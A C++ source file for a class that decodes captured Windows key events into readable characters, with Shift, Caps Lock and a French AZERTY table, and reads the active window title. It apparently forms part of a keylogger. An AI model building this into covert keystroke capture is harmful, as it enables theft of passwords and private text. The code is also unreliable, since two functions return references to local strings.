
#include "Analyser.h"

Analyser::Analyser()
{
	initMap();
}

Analyser::~Analyser()
{
}

int	 Analyser::isCapsLock() const
{
	return (GetKeyState(VK_CAPITAL) & 0x0001);
}

std::string&		Analyser::getWindowTitle(AEvent* e)
{
	std::string		res = e->getContext()._windowTitle;
	return (res);
}

std::string&				Analyser::analysis(AEvent* event)
{
	std::string s("");
	if (GetAsyncKeyState(VK_SHIFT) ^ isCapsLock() && _translateShiftMap.find(event->getVirtualKeyCode()) != _translateShiftMap.end())
	{
		std::cout << _translateShiftMap[event->getVirtualKeyCode()].c_str() << std::endl;
	}
	else
	{
		if (_translateMap.find(event->getVirtualKeyCode()) != _translateMap.end())
			std::cout << _translateMap[event->getVirtualKeyCode()].c_str() << std::endl;
		else if ((event->getVirtualKeyCode() > 64) && (event->getVirtualKeyCode() < 91)) // Keys a-z
		{
			char c = MapVirtualKey(event->getVirtualKeyCode(), MAPVK_VK_TO_CHAR); // Un-capitalize letters
			if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) // Check if letters should be lowercase
			{
				c += 32;
			}
			s.append(&c, 1);
			s.append("\0");
			std::cout << s.c_str() << std::endl;
		}
	}
	return s;
}

void						Analyser::initMap()
{
	_translateMap[VK_CANCEL] = "[Cancel]";
	_translateMap[VK_SPACE] = " ";
	_translateMap[VK_LCONTROL] = "[LCtrl]";
	_translateMap[VK_RCONTROL] = "[RCtrl]";
	_translateMap[VK_LMENU] = "[LAlt]";
	_translateMap[VK_RMENU] = "[RAlt]";
	_translateMap[VK_LWIN] = "[LWindows]";
	_translateMap[VK_RWIN] = "[RWindows]";
	_translateMap[VK_APPS] = "[Applications]";
	_translateMap[VK_SNAPSHOT] = "[PrintScreen]";
	_translateMap[VK_INSERT] = "[Insert]";
	_translateMap[VK_PAUSE] = "[Pause]";
	_translateMap[VK_VOLUME_MUTE] = "[VolumeMute]";
	_translateMap[VK_VOLUME_DOWN] = "[VolumeDown]";
	_translateMap[VK_VOLUME_UP] = "[VolumeUp]";
	_translateMap[VK_SELECT] = "[Select]";
	_translateMap[VK_HELP] = "[Help]";
	_translateMap[VK_EXECUTE] = "[Execute]";
	_translateMap[VK_DELETE] = "[Delete]";
	_translateMap[VK_CLEAR] = "[Clear]";
	_translateMap[VK_RETURN] = "[Enter]";
	_translateMap[VK_BACK] = "[Backspace]";
	_translateMap[VK_TAB] = "[Tab]";
	_translateMap[VK_ESCAPE] = "[Escape]";
	_translateMap[VK_LSHIFT] = "[LShift]";
	_translateMap[VK_RSHIFT] = "[RShift]";
	_translateMap[VK_CAPITAL] = "[CapsLock]";
	_translateMap[VK_NUMLOCK] = "[NumLock]";
	_translateMap[VK_SCROLL] = "[ScrollLock]";
	_translateMap[VK_HOME] = "[Home]";
	_translateMap[VK_END] = "[End]";
	_translateMap[VK_PLAY] = "[Play]";
	_translateMap[VK_ZOOM] = "[Zoom]";
	_translateMap[VK_DIVIDE] = "[/]";
	_translateMap[VK_MULTIPLY] = "[*]";
	_translateMap[VK_SUBTRACT] = "[-]";
	_translateMap[VK_ADD] = "[+]";
	_translateMap[VK_PRIOR] = "[PageUp]";
	_translateMap[VK_NEXT] = "[PageDown]";
	_translateMap[VK_LEFT] = "[LArrow]";
	_translateMap[VK_RIGHT] = "[RArrow]";
	_translateMap[VK_UP] = "[UpArrow]";
	_translateMap[VK_DOWN] = "[DownArrow]";
	_translateMap[VK_SLEEP] = "[Sleep]";
	_translateMap[VK_NUMPAD0] = "[0]";
	_translateMap[VK_NUMPAD1] = "[1]";
	_translateMap[VK_NUMPAD2] = "[2]";
	_translateMap[VK_NUMPAD3] = "[3]";
	_translateMap[VK_NUMPAD4] = "[4]";
	_translateMap[VK_NUMPAD5] = "[5]";
	_translateMap[VK_NUMPAD6] = "[6]";
	_translateMap[VK_NUMPAD7] = "[7]";
	_translateMap[VK_NUMPAD8] = "[8]";
	_translateMap[VK_NUMPAD9] = "[9]";
	_translateMap[VK_F1] = "[F1]";
	_translateMap[VK_F2] = "[F2]";
	_translateMap[VK_F3] = "[F3]";
	_translateMap[VK_F4] = "[F4]";
	_translateMap[VK_F5] = "[F5]";
	_translateMap[VK_F6] = "[F6]";
	_translateMap[VK_F7] = "[F7]";
	_translateMap[VK_F8] = "[F8]";
	_translateMap[VK_F9] = "[F9]";
	_translateMap[VK_F10] = "[F10]";
	_translateMap[VK_F11] = "[F11]";
	_translateMap[VK_F12] = "[F12]";
	_translateMap[VK_F13] = "[F13]";
	_translateMap[VK_F14] = "[F14]";
	_translateMap[VK_F15] = "[F15]";
	_translateMap[VK_F16] = "[F16]";
	_translateMap[VK_F17] = "[F17]";
	_translateMap[VK_F18] = "[F18]";
	_translateMap[VK_F19] = "[F19]";
	_translateMap[VK_F20] = "[F20]";
	_translateMap[VK_F21] = "[F21]";
	_translateMap[VK_F22] = "[F22]";
	_translateMap[VK_F23] = "[F23]";
	_translateMap[VK_F24] = "[F24]";
	_translateMap[VK_OEM_1] = "$";
	_translateMap[VK_OEM_PLUS] = "=";
	_translateMap[VK_OEM_COMMA] = ",";
	_translateMap[VK_OEM_MINUS] = "-";
	_translateMap[VK_OEM_PERIOD] = ";";
	_translateMap[VK_OEM_2] = ":";
	_translateMap[VK_OEM_3] = "ù";
	_translateMap[VK_OEM_4] = ")";
	_translateMap[VK_OEM_5] = "*";
	_translateMap[VK_OEM_6] = "^";
	_translateMap[VK_OEM_7] = "²";
	_translateMap[VK_OEM_8] = "!";
	_translateMap[0x30] = "@";
	_translateMap[0x31] = "&";
	_translateMap[0x32] = "~";
	_translateMap[0x33] = "\"";
	_translateMap[0x34] = "\'";
	_translateMap[0x35] = "(";
	_translateMap[0x36] = "-";
	_translateMap[0x37] = "`";
	_translateMap[0x38] = "_";
	_translateMap[0x39] = "^";
	_translateShiftMap[VK_OEM_1] = "£";
	_translateShiftMap[VK_OEM_PLUS] = "+";
	_translateShiftMap[VK_OEM_COMMA] = "?";
	_translateShiftMap[VK_OEM_PERIOD] = ".";
	_translateShiftMap[VK_OEM_2] = "/";
	_translateShiftMap[VK_OEM_3] = "%";
	_translateShiftMap[VK_OEM_4] = "°";
	_translateShiftMap[VK_OEM_5] = "µ";
	_translateShiftMap[VK_OEM_6] = "¨";
	_translateShiftMap[VK_OEM_8] = "§";
	_translateShiftMap[0x30] = "0";
	_translateShiftMap[0x31] = "1";
	_translateShiftMap[0x32] = "2";
	_translateShiftMap[0x33] = "3";
	_translateShiftMap[0x34] = "4";
	_translateShiftMap[0x35] = "5";
	_translateShiftMap[0x36] = "6";
	_translateShiftMap[0x37] = "7";
	_translateShiftMap[0x38] = "8";
	_translateShiftMap[0x39] = "9";

}